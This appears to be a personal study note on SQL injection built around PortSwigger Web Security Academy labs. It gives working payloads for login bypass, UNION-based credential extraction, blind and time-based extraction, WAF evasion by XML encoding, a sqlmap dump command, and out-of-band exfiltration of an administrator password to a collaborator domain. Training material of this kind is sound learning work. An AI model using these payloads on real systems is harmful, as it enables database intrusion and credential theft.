![[sql-injection.svg]]
# What is SQLi ?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve.
# What is the impact of a successful SQL injection attack? 
- Passwords
- Credit card details
- Personal user information
# How to detect SQL injection vulnerabilities
- The single quote character `'` and look for errors or other anomalies.
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`.
- Payloads designed to trigger time delays when executed within a SQL query
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query.
## SQL injection UNION attacks {union|blue}
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database.
For a `UNION` query to work, two key requirements must be met :
1. The individual queries must return the same number of columns.
2. The data types in each column must be compatible between the individual queries.
#### So how can I know how many columns are returned from the original query ?
###### First way
One method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs For example, if the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
`' ORDER BY 1--`
`' ORDER BY 2--`
`' ORDER BY 3--`
`etc.`
This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as :
`The ORDER BY position number 3 is out of range of the number of items in the select list.`
###### Second way
The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:
`' UNION SELECT NULL--`
`' UNION SELECT NULL,NULL--`
`' UNION SELECT NULL,NULL,NULL--`
`etc.`
If the number of nulls does not match the number of columns, the database returns an error, such as:
`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.`

---

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

`' UNION SELECT NULL FROM DUAL--`

---
# Examining the database in SQL injection attacks {newarr|limegreen|5}
To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:
- The type and version of the database software.
- The tables and columns that the database contains.
### Listing the contents of the database
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
For example, you can query `information_schema.tables` to list the tables in the database:
`SELECT * FROM information_schema.tables`
### Listing the contents of an Oracle database
On Oracle, you can find the same information as follows:
- You can list tables by querying `all_tables`:
    `SELECT * FROM all_tables`
- You can list columns by querying `all_tab_columns`:
    `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`

# Blind SQL injection vulnerabilities {arr|orange|10}
Many instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses
- such as a divide-by-zero
- time delay in the processing of the query
- out-of-band network interaction For example, you can place the data into a DNS lookup for a domain that you control
*Some applications carry out SQL queries but their behaviour doesn't change, regardless of whether the query returns any data.*




# Second-order SQL injection
Second-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.
![[second-order-sql-injection.svg]]
## SQL injection in different contexts
some websites take input in JSON or XML format and use this to query the database.
These different formats may provide different ways for you to obfuscate attacks that are otherwise blocked due to WAFs and other defence mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`: 
`<stockCheck>`
    `<productId>123</productId>`
    `<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>`
`</stockCheck>`
This will be decoded server-side before being passed to the SQL interpreter.

---
However, there are also many differences between common databases. These mean that some techniques for detecting and exploiting SQL injection work differently on different platforms. For example:
- Syntax for string concatenation.
- Comments.
- Batched (or stacked) queries.
- Platform-specific APIs.
- Error messages.

## Labs
* #Portswigger
	1. **SQL injection vulnerability in WHERE clause allowing retrieval of hidden data** #APPRENTICE 
		SQLi to display more products
		*link :*
		`https://0a91002603d47610802576c000a10027.web-security-academy.net/filter?category=Accessories%27%20OR%201=1--`
	2. **SQL injection vulnerability allowing login bypass** #APPRENTICE 
		SQLi to login as admin
		*credentials :*
		username = administrator'-- 
		password = *blank*
	3. **SQL injection attack, querying the database type and version on Oracle** #PRACTITIONER {newarr}
		to select the version of the database
		*payload :*
		`'+UNION+SELECT+BANNER,+NULL+FROM+v$version--`
	4. **SQL injection attack, querying the database type and version on MySQL and Microsoft** #PRACTITIONER {newarr}
		payload :
		`'+union+select+%40%40version,null--+`
	5. **SQL injection attack, listing the database contents on non-Oracle databases** #PRACTITIONER {newarr}
		*first get the number of columns :*
		*second get the tables name :*
		`'union select table_name,null from information_schema.tables`
		*third get the columns name :*
		`union select column_name,null from information_schema.tables where table_name = 'usernames_sadasd'`
		*fourth get the user and password :*
		`union select username_asdasd,password_asdasd from usernames_asddfsdf`
	6. **SQL injection attack, listing the database contents on Oracle** #PRACTITIONER {newarr}
		*first get the number of columns :*
		*second get the tables name :*
		`'union select table_name,null FROM all_tables`
		*third get the columns name :*
		`union select column_name,null FROM all_tab_columns WHERE table_name = 'USERS_BQISMW'`
		*fourth get the user and password :*
		`' union select USERNAME_BANIHE,PASSWORD_STTJNC FROM USERS_BQISMW--`
	7. **SQL injection UNION attack, determining the number of columns returned by the query** #PRACTITIONER {union}
		by adding null values until the error disappear we can know the number of columns
		payload :
		`' union select null,null,null --`
	8. **SQL injection UNION attack, finding a column containing text** #PRACTITIONER {union}
		first I get the number of columns then I get the random value by trying to put it instead of every null
		*payload :*
		`' union select null,'awr1iF',null --`
	9. **SQL injection UNION attack, retrieving data from other tables** #PRACTITIONER {union}
		I got the admin password using this SQLi query
		*payload :*
		`'union select username,password from users`
	10. **SQL injection UNION attack, retrieving multiple values in a single column** {union} #PRACTITIONER 
		I got the admin password using this SQLi query
		*payload :*
		`'+UNION+SELECT+NULL,username||'~'||password+FROM+users--`
	11. **Blind SQL injection with conditional responses** #PRACTITIONER {arr}
		using SQL map 
		`sqlmap -u "https://0a23001e038b621c806821b10088002d.web-security-academy.net/filter?category=Gifts" --cookie="TrackingId=l9j3COjjtVS4Xsuq*" -T users -C password --where="username='administrator'" --batch --dump`
	12. **Blind SQL injection with conditional errors** #PRACTITIONER {arr}
		the error brings write value
		*payload :*
		`'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
	13. **Visible error-based SQL injection** #PRACTITIONER {arr}
		*payload :*
		`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`
	14. **Blind SQL injection with time delays** #PRACTITIONER {arr}
		*payload :*
		`'||pg_sleep(10)--`
	15. **Blind SQL injection with time delays and information retrieval** #PRACTITIONER {arr}
		*payload :*
		`'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,2,1)='§a§')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
	16. **Blind SQL injection with out-of-band interaction** #PRACTITIONER {arr}
		*payload :*	`TZJBuwu2qlMksRIl'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//075qwx6uz9rkyh1ok18t33cklbr2fu3j.oastify.com/">+%25remote%3b]>'),'/l')+FROM+dual--`
	17. **Blind SQL injection with out-of-band data exfiltration** #PRACTITIONER {arr}
		*payload :*
		`'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+`
		`encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
	18. **SQL injection with filter bypass via XML encoding** #PRACTITIONER 
		encoding using **hackvertor**
		*payload :*
		`<@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities>`
		why the firewall did not catch this payload ???
		`<@hex_entities>...</@hex_entities>`
		Now most WAFs don’t know what to do with this:
	    Is `<@hex_entities>` a *tag?* a *namespace?* *metadata?*
	    They often treat this like markup, not actual content to scan. So instead of parsing and extracting its text, the WAF sees it as structured XML it doesn’t understand — and skips regex checks inside it.

## How to prevent SQL injection
- parameterized queries also know as "prepared statements"
- Whitelisting permitted input values.
- Using different logic to deliver the required behaviour.
```chartsview
#-----------------#
#- chart type    -#
#-----------------#
type: Radar

#-----------------#
#- chart data    -#
#-----------------#
data:
  - item: "Back-End Code"
    user: "Effective against the attack"
    score: 95
  - item: "Browser"
    user: "Effective against the attack"
    score: 0
  - item: "Server"
    user: "Effective against the attack"
    score: 20
  - item: "Client-Side Code"
    user: "Effective against the attack"
    score: 0
  - item: "WAF"
    user: "Effective against the attack"
    score: 50

#-----------------#
#- chart options -#
#-----------------#
options:
  xField: "item"
  yField: "score"
  seriesField: "user"
  meta:
    score:
      alias: "Score"
      min: 0
      nice: true
  xAxis:
    line: null
    tickLine: null
  yAxis:
    label: false
    grid:
      alternateColor: "rgba(0, 0, 0, 0.1)"
  point: {}
  area: {}
```
# NOTES
- In some situations, an attacker can escalate an SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks
- On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.
# Techniques
#### 1. Normal SQL injection at the GET parameter
#### 2. Login bypass
*credentials :*
		username = administrator'-- 
		password = *blank*
#### 3. Try apply SQLi in different context
- XML data
- JSON data
#### 4.  